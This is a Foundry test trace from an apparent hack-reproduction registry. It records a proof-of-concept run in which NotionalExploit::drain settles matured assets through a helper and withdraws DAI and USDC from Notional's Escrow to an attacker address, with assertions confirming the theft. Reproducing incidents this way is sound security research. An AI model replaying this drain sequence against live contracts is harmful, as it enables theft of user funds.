+    │   │   │   │   │   ├─ [2094] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1098] AccessControlledOCR2Aggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   ├─ [2094] 0x986b5E1e1755e3C2440e960477f25201B0a8bbD4::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1098] 0x26ae9b951F84e6c28f58a92133C30e312D42e0Fe::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 399780384091197 [3.997e14]
+    │   │   │   │   │   │   └─ ← [Return] 399780384091197 [3.997e14]
+    │   │   │   │   │   └─ ← [Return] [0, 119283316734628937043473406716590624 [1.192e35], -928263990084890864833 [-9.282e20], 0]
+    │   │   │   │   └─ ← [Return] [0, 119283316734628937043473406716590624 [1.192e35], -928263990084890864833 [-9.282e20], 0]
+    │   │   │   └─ ← [Return] 119283316734628008779483321825725791 [1.192e35]
+    │   │   └─ ← [Return] 119283316734628008779483321825725791 [1.192e35]
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000005872b67d58cef954b52deb8e97f9f614bb12fa3d
+    │   │   @ 1: 0 → 0x00000000000000000000000084a060ed81316e6741af216a099cfea8bcdd3489
+    │   │   @ 3: 0 → 0x000000006b10b1006a9a0a004a3508c5ac0677325932f3bc786ae7a1c3e9caff
+    │   │   @ 2: 0 → 0x000000000000000000000000265ccff3673bcab03867988081cd51bfd919c03c
+    │   └─ ← [Stop]
+    ├─ [0] VM::warp(1788480095 [1.788e9])
+    │   └─ ← [Return]
+    ├─ [254017] NotionalExploit::drain(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38])
+    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   │   └─ ← [Return] 69257372677950923155658 [6.925e22]
+    │   ├─ [1339] FiatTokenProxy::fallback(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   │   ├─ [553] FiatTokenV2_2::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [delegatecall]
+    │   │   │   └─ ← [Return] 1658524864122 [1.658e12]
+    │   │   └─ ← [Return] 1658524864122 [1.658e12]
+    │   ├─ [121525] NotionalHelper::settleAndWithdraw(0x0A4721117040ABF319b954aBF13F654505C34920, Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683], 0x6B175474E89094C44Da98b954EedeAC495271d0F, 69257372677950923155658 [6.925e22], AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38])
+    │   │   ├─ [34266] 0x0A4721117040ABF319b954aBF13F654505C34920::settleMaturedAssets(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C])
+    │   │   │   ├─ [33582] Portfolios::settleMaturedAssets(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C]) [delegatecall]
+    │   │   │   │   ├─ [26903] Escrow::fallback(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], [0, 69257372677950923155658 [6.925e22], 0, 0])
+    │   │   │   │   │   ├─ [26154] Escrow::portfolioSettleCash(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], [0, 69257372677950923155658 [6.925e22], 0, 0]) [delegatecall]
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd3be08968356b15b9cbe4879f8f2495ab4f60523fdc16d6feeaa5b292122e5ad: 0 → 0x000000000000000000000000000000000000000000000eaa731f454f3ce928ca
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ emit SettleAccount(account: NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x22acd6d941277221f501835219cb7f1a9b99f20e7fd7c43ca266083a9bfe6d62: 0x000000000000000000000eaa731f454f3ce928ca3b9aca00a86a9a0a00000002 → 0
+    │   │   │   │   │   @ 0x7754241098d032959d846e9742e35bd26ed43669ba7b2f4c067139de8336e5ee: 1 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [60366] Escrow::fallback(0x6B175474E89094C44Da98b954EedeAC495271d0F, 69257372677950923155658 [6.925e22])
+    │   │   │   ├─ [59679] Escrow::withdraw(0x6B175474E89094C44Da98b954EedeAC495271d0F, 69257372677950923155658 [6.925e22]) [delegatecall]
+    │   │   │   │   ├─ [1681] 0x0A4721117040ABF319b954aBF13F654505C34920::settleMaturedAssets(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C])
+    │   │   │   │   │   ├─ [997] Portfolios::settleMaturedAssets(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [19131] 0x0A4721117040ABF319b954aBF13F654505C34920::freeCollateralViewAggregateOnly(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C]) [staticcall]
+    │   │   │   │   │   ├─ [18412] Portfolios::freeCollateralViewAggregateOnly(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C]) [delegatecall]
+    │   │   │   │   │   │   ├─ [9529] Escrow::fallback(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [8786] Escrow::getBalances(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   ├─ [3280] Escrow::fallback([0, 0, 0, 0]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2551] Escrow::convertBalancesToETH([0, 0, 0, 0]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [28174] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], 69257372677950923155658 [6.925e22])
+    │   │   │   │   │   ├─ emit Transfer(from: Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683], to: NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], amount: 69257372677950923155658 [6.925e22])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x92015eb1f47179502451517baf780df2bfc4862c47f19454144818081a10b636: 0 → 0x000000000000000000000000000000000000000000000eaa731f454f3ce928ca
+    │   │   │   │   │   │   @ 0xb4f60e66cc624f306dc4e1b635e5e4df0e6cd361d2d180806c7f5accbe159e34: 0x000000000000000000000000000000000000000000000eaa731f454f3ce928ca → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Withdraw(currency: 1, account: NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], value: 69257372677950923155658 [6.925e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd3be08968356b15b9cbe4879f8f2495ab4f60523fdc16d6feeaa5b292122e5ad: 0x000000000000000000000000000000000000000000000eaa731f454f3ce928ca → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [23374] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], 69257372677950923155658 [6.925e22])
+    │   │   │   ├─ emit Transfer(from: NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], to: AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], amount: 69257372677950923155658 [6.925e22])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa47176da391edd15ad074326895b6d8b58b7be67416564241378bdd995b0d969: 0 → 0x000000000000000000000000000000000000000000000eaa731f454f3ce928ca
+    │   │   │   │   @ 0x92015eb1f47179502451517baf780df2bfc4862c47f19454144818081a10b636: 0x000000000000000000000000000000000000000000000eaa731f454f3ce928ca → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [125481] NotionalHelper::settleAndWithdraw(0x0A4721117040ABF319b954aBF13F654505C34920, Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683], FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 1658524864122 [1.658e12], AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38])
+    │   │   ├─ [32266] 0x0A4721117040ABF319b954aBF13F654505C34920::settleMaturedAssets(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF])
+    │   │   │   ├─ [31582] Portfolios::settleMaturedAssets(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF]) [delegatecall]
+    │   │   │   │   ├─ [24903] Escrow::fallback(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], [0, 0, 1658524864122 [1.658e12], 0])
+    │   │   │   │   │   ├─ [24154] Escrow::portfolioSettleCash(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], [0, 0, 1658524864122 [1.658e12], 0]) [delegatecall]
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xa92398dcb5452dc18b2220900ff799d3cf0c86887ea5361cc24103513b292361: 0 → 0x0000000000000000000000000000000000000000000000000000018227c90e7a
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ emit SettleAccount(account: NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x420082e35bd584ba6add3a3d3fd6c87eba067b5e776adb9f4ec779d39c5dfefd: 0x0000000000000000000000000000018227c90e7a3b9aca00a86a9a0a00000003 → 0
+    │   │   │   │   │   @ 0xf6dfa4fd6f77b4aec2bca886eca70fdad4d06110264e7b56893c01992493a17b: 1 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [64344] Escrow::fallback(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 1658524864122 [1.658e12])
+    │   │   │   ├─ [63657] Escrow::withdraw(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 1658524864122 [1.658e12]) [delegatecall]
+    │   │   │   │   ├─ [1681] 0x0A4721117040ABF319b954aBF13F654505C34920::settleMaturedAssets(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF])
+    │   │   │   │   │   ├─ [997] Portfolios::settleMaturedAssets(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [19131] 0x0A4721117040ABF319b954aBF13F654505C34920::freeCollateralViewAggregateOnly(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF]) [staticcall]
+    │   │   │   │   │   ├─ [18412] Portfolios::freeCollateralViewAggregateOnly(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF]) [delegatecall]
+    │   │   │   │   │   │   ├─ [9529] Escrow::fallback(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [8786] Escrow::getBalances(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   ├─ [3280] Escrow::fallback([0, 0, 0, 0]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2551] Escrow::convertBalancesToETH([0, 0, 0, 0]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [32152] FiatTokenProxy::fallback(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], 1658524864122 [1.658e12])
+    │   │   │   │   │   ├─ [31363] FiatTokenV2_2::transfer(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], 1658524864122 [1.658e12]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683], to: NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], amount: 1658524864122 [1.658e12])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf566058f1f955acf3f45d71344fd681fe45b00498040d226bd69cc8e35643370: 0 → 0x0000000000000000000000000000000000000000000000000000018227c90e7a
+    │   │   │   │   │   │   │   @ 0x96e23ac37c9d7de2b03393973ff9d55155ef14e508470ed1472920c4f2128cd0: 0x0000000000000000000000000000000000000000000000000000018227c90e7a → 0
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Withdraw(currency: 2, account: NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], value: 1658524864122 [1.658e12])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa92398dcb5452dc18b2220900ff799d3cf0c86887ea5361cc24103513b292361: 0x0000000000000000000000000000000000000000000000000000018227c90e7a → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [25352] FiatTokenProxy::fallback(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], 1658524864122 [1.658e12])
+    │   │   │   ├─ [24563] FiatTokenV2_2::transfer(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], 1658524864122 [1.658e12]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], to: AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], amount: 1658524864122 [1.658e12])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf566058f1f955acf3f45d71344fd681fe45b00498040d226bd69cc8e35643370: 0x0000000000000000000000000000000000000000000000000000018227c90e7a → 0
+    │   │   │   │   │   @ 0x42234872e6d507a412887c65eeadc0d146c6dd56189aaa38caf102f7eb0fdb42: 0 → 0x0000000000000000000000000000000000000000000000000000018227c90e7a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   └─ ← [Return] 69257372677950923155658 [6.925e22]
+    ├─ [1339] FiatTokenProxy::fallback(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [delegatecall]
+    │   │   └─ ← [Return] 1658524864122 [1.658e12]
+    │   └─ ← [Return] 1658524864122 [1.658e12]
+    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [1339] FiatTokenProxy::fallback(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "attacker DAI gain", val: 69257372677950923155658 [6.925e22], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "attacker USDC gain", val: 1658524864122 [1.658e12], decimals: 6)
+    ├─ [0] VM::assertEq(69257372677950923155658 [6.925e22], 69257372677950923155658 [6.925e22], "DAI gain mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(1658524864122 [1.658e12], 1658524864122 [1.658e12], "USDC gain mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(69257372677950923155658 [6.925e22], 69257372677950923155658 [6.925e22], "escrow DAI loss mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(1658524864122 [1.658e12], 1658524864122 [1.658e12], "escrow USDC loss mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_string(val: "=== After exploit ===")
+    ├─ [672] 0x6B175474E89094C44Da98b954EedeAC495271d0F::symbol() [staticcall]
+    │   └─ ← [Return] "DAI"
+    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   └─ ← [Return] 69257372677950923155658 [6.925e22]
+    ├─ [240] 0x6B175474E89094C44Da98b954EedeAC495271d0F::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " DAI Balance", val: 69257372677950923155658 [6.925e22], decimals: 18)
+    ├─ [1870] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [1081] FiatTokenV2_2::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [1339] FiatTokenProxy::fallback(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [delegatecall]
+    │   │   └─ ← [Return] 1658524864122 [1.658e12]
+    │   └─ ← [Return] 1658524864122 [1.658e12]
+    ├─ [1164] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: " USDC Balance", val: 1658524864122 [1.658e12], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.97s (28.36ms CPU time)
+
+Ran 1 test suite in 16.77s (3.97s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/workspaces/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 25192 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /workspaces/RustroverProjects/audits/evm-hack-registry/2026-09-NotionalFinance_exp)
